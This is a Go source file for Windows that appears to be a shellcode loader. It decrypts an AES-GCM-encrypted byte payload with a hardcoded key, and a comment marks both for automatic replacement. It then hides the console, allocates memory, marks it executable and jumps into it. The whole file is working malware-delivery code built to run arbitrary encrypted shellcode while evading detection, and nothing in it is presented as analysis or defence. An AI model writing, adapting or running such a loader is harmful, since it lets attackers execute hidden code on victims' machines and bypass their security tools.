//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Auto-replace markers for key and payload

var buf = []byte { 
	0x4f, 0x7f, 0xc0, 0xd9, 0x91, 0x7e, 0x24, 0xd, 0x31, 0x45, 0xd7, 0x47, 0x59, 0x44, 0x5f, 0xb0, 
	0x36, 0x30, 0x5e, 0xb7, 0x60, 0x1b, 0xeb, 0xd5, 0x2, 0xfa, 0x2a, 0x4f, 0x7e, 0x47, 0x9a, 0xce, 
	0xbb, 0xb2, 0xff, 0x1, 0xc9, 0xb2, 0x96, 0x4c, 0x8a, 0xe4, 0x6, 0xa1, 0x7c, 0x18, 0xd7, 0xae, 
	0x84, 0x27, 0x60, 0x86, 0x15, 0xb6, 0x3d, 0xe, 0x19, 0xad, 0xaf, 0xa1, 0x2c, 0x7c, 0xa4, 0x3, 
	0xd2, 0x77, 0x1f, 0x99, 0xcc, 0x34, 0xd3, 0x3d, 0x12, 0x2c, 0x1f, 0x13, 0xd7, 0xd7, 0xb, 0xdf, 
	0x8e, 0xdb, 0x85, 0xbb, 0x3, 0xe4, 0x8e, 0xdd, 0xa3, 0xdd, 0x11, 0x9, 0x13, 0xa4, 0xa5, 0xd9, 
	0xda, 0x19, 0xef, 0x73, 0xae, 0x13, 0x6d, 0xa9, 0x19, 0xf5, 0x5a, 0x55, 0x8a, 0xbf, 0xd5, 0x51, 
	0xf4, 0x46, 0x98, 0xfd, 0x5e, 0x1, 0x9a, 0xa5, 0xf4, 0x47, 0xf7, 0xe1, 0xb3, 0xce, 0xfc, 0x68, 
	0xcc, 0xdf, 0xfb, 0xfa, 0x77, 0xe2, 0x96, 0x9d, 0x94, 0x4, 0x90, 0x55, 0xc7, 0xab, 0x5c, 0x41, 
	0x2, 0xf3, 0x12, 0xbd, 0xb, 0x58, 0x7c, 0xc0, 0xd2, 0xc3, 0xd4, 0xa0, 0x52, 0x86, 0x64, 0xc9, 
	0x4, 0x35, 0x6c, 0xcd, 0xf1, 0x43, 0x2c, 0x40, 0x16, 0x64, 0x1c, 0x3e, 0x15, 0x49, 0xeb, 0x6b, 
	0xfb, 0xb7, 0x94, 0xd9, 0xb4, 0xcb, 0x44, 0x94, 0x58, 0x21, 0xf8, 0x5c, 0xdd, 0x6c, 0xcb, 0x5c, 
	0x89, 0xa3, 0x7b, 0x2e, 0xdb, 0x8f, 0x55, 0xcb, 0x83, 0xd1, 0x5, 0x9f, 0x67, 0x57, 0xf0, 0x10, 
	0x92, 0xa5, 0x31, 0x20, 0xb4, 0x79, 0xe0, 0xd0, 0xd0, 0x51, 0xc0, 0x9f, 0x1f, 0xb2, 0x86, 0xe0, 
	0x9f, 0x65, 0x5b, 0x5e, 0x97, 0x89, 0x78, 0x39, 0xa6, 0x2f, 0xc3, 0x51, 0x8, 0x95, 0x7e, 0x52, 
	0x96, 0xbb, 0xd5, 0x9b, 0x57, 0x6f, 0xbf, 0xb4, 0xdf, 0x73, 0xaa, 0x1b, 0xd0, 0xcd, 0x2d, 0x19, 
	0xad, 0xe6, 0xa9, 0xab, 0xa4, 0x71, 0xc, 0xbd, 0x6d, 0x6a, 0x31, 0xc0, 0x7e, 0x7c, 0xca, 0xc, 
	0x69, 0x98, 0xd, 0xd, 0x8d, 0x3f, 0x92, 0x8a, 0xea, 0xc9, 0x24, 0x0, 0x8e, 0x60, 0x10, 0x4e, 
	0x1e, 0x7e, 0x81, 0xeb, 0x5a, 0x33, 0x92, 0xfd, 0x2, 0xf1, 0x6b, 0x29, 0xb8, 0x9d, 0xfa, 0x11} 



var key = []byte { 
	0x94, 0x7f, 0x4a, 0x36, 0xf0, 0x7f, 0xa8, 0xe0, 0x78, 0xdf, 0x96, 0xbc, 0xab, 0x52, 0xd9, 0x29, 
	0x74, 0x6d, 0xe1, 0xdc, 0x58, 0x25, 0x31, 0xc1, 0x1f, 0xd, 0x8b, 0x96, 0x9a, 0x77, 0x3f, 0x6c} 




//Start
func check(err error) {
	if err != nil {
		panic(err)
	}
}

func decryptAES(ciphertext []byte, eKey []byte) (plaintext []byte) {
	c, err := aes.NewCipher(eKey)
	check(err)

	gcm, err := cipher.NewGCM(c)
	check(err)

	nonceSize := gcm.NonceSize()

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err = gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	return
}

func useSysCall(sc []byte) {

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
    FreeConsole.Call()

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}

	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	useSysCall(decryptAES(buf, key))
}
